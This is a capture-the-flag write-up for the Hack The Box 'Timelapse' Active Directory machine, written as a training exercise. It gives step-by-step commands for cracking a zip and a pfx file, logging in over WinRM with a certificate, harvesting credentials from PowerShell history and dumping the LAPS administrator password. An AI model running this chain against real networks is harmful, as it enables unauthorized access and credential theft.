---
date: 2025-03-15
categories: [Windows, Easy, AD]
---

![Timelapse](https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [ctrlzero](https://app.hackthebox.com/users/168546)        | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Windows   |

---







- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
	
	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.11.152 -oG scan
	/opt/extractports scan
	nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695,49727 -sCV -Pn 10.10.11.152 -oN ports
	```

	![image](https://github.com/user-attachments/assets/fcdafced-0d36-44ad-bbcf-931b7a492c38)

- I found the domains `dc01.timelapse.htb` and `timelapse.htb`, I added it to the `hosts` file
- I begin by listing the resources shared by smb using null credentials. They allow me to observe that I have reading permissions on the “Shares” folder. Inside it I find a zip file. I download it and see that it requires a password to extract its contents.
	
	```python
	netexec smb 10.10.11.152 -u Guest -p "" --shares
	smbclient -U 'Guest' //10.10.11.152/Shares
	```

	![image](https://github.com/user-attachments/assets/c0d81453-cde9-4e5b-b2c8-aab346fbc1fc)

- I extract the hash and with john I get the password to extract the files.
	
	```python
	zip2john winrm_backup.zip  > ziphash  
	john -w=/usr/share/wordlists/rockyou.txt ziphash
	```
	
	![image](https://github.com/user-attachments/assets/fbb2c0a6-860f-4f6a-b9f7-cc6bb8114ef0)

- I manage to extract a .pfx file that is password protected. I extract the hash and again with john I get to see the password of the file.
	
	```python
	pfx2john legacyy_dev_auth.pfx > hashpfx
	john -w=/usr/share/wordlists/rockyou.txt hashpfx 
	```
	
  ![image](https://github.com/user-attachments/assets/f740ee9c-7522-44d5-9d54-7e8e0a564af3)

- At this point I can extract the SSL certificate in PKCS#12 format and the private key.
	
	```python
	openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
	openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
	```

- With these files I can use them to connect via winrm to the system. I get access and get the first flag.
	
	```python
	evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S -r timelapse.htb
	```
	
	![image](https://github.com/user-attachments/assets/26d9454b-1c6c-4917-adb5-43728a16b3d8)
	
- I list the system thanks to [Sharphound](https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.0) and then look at potential privilege escalation paths with bloodhound. I collect the information but I don't observe anything by relieving.

```python
.\SharpHound.exe -c All --zipfilename info
```

- I decide to consult the history of executed powrshell commands and inside it I find the credentials of the user svc_deploy. I validate them with netexec and confirm that they are correct.

	```python
	foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
	```

	![image](https://github.com/user-attachments/assets/a6e0221d-9fc4-4838-9130-18075c32ca6d)

- In the first part of the recognition we have seen that the system has port 5986 open and thanks to this we can connect to the system through WINRM indicating that we want to use SSL. 
	
	```python
	evil-winrm -S -i 10.10.11.152 -u svc_deploy -p 'E3XXXXXXXXXXXXXXXXXuaV'
	```

- Once inside the system we consult the information related to this user and we observe that it belongs to the group LAPS_Readers, “Local Administrator Password Solution” (LAPS). This group is used to manage the passwords of the DC computers. We can retrieve the administrator password. 

	![image](https://github.com/user-attachments/assets/0191c7fa-7455-46d3-aa4e-095d5026374a)

- To recover the password we can make a query on the Active Directory computer. [info](https://exploit-notes.hdks.org/exploit/windows/active-directory/laps-pentesting/)

	```python
	<active-directory-computer-name> => (Get-ADComputer -Identity $env:COMPUTERNAME).Name
	
	#Get-ADComputer -Identity '<active-directory-computer-name>' -property 'ms-mcs-admpwd'
	Get-ADComputer -Identity 'DC01' -property 'ms-mcs-admpwd'
	```

	![image](https://github.com/user-attachments/assets/db84c907-8fa5-41fa-b02d-37d571e60d10)

- Another way to extract the LAPS password would be through netexec.
	
	```python
	netexec smb 10.10.11.152 -u svc_deploy -p 'E3XXXXXXXXXXXXXXXXXuaV' --laps Administrator
	```

- Having the password we can connect to the system as administrator and we can read the second flag.

	```python
	evil-winrm -S -i 10.10.11.152 -u administrator -p '6JXXXXXXXXXXXp5'
	```

	![image](https://github.com/user-attachments/assets/9cb3bbfc-3612-44da-b0a4-e6bfa478842a)

